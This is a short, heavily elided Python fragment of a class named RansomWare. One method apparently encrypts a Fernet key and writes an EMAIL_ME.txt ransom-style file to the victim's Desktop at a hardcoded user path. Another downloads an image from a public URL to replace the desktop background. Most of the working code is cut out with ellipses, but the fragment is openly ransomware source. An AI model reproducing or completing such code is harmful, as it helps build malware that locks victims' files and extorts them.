...
class RansomWare:
    ...
    def encrypt_fernet_key(self):
        desktopPath = r'C:\Users\yaynu\OneDrive\Desktop'
        emailFileName = 'EMAIL_ME.txt'
        ...
        with open(fr'{self.sysRoot}\OneDrive\Desktop\EMAIL_ME.txt', 'wb') as fa:
    ...
    def change_desktop_background(self):
        imageUrl = 'https://static.wikia.nocookie.net/impracticaljokers/images/d/d2/Sal.png/revision/latest?cb=20190604013345'
        # Go to specif url and download+save image using absolute path
        path = fr'{self.sysRoot}\OneDrive\Desktop\background.jpg'
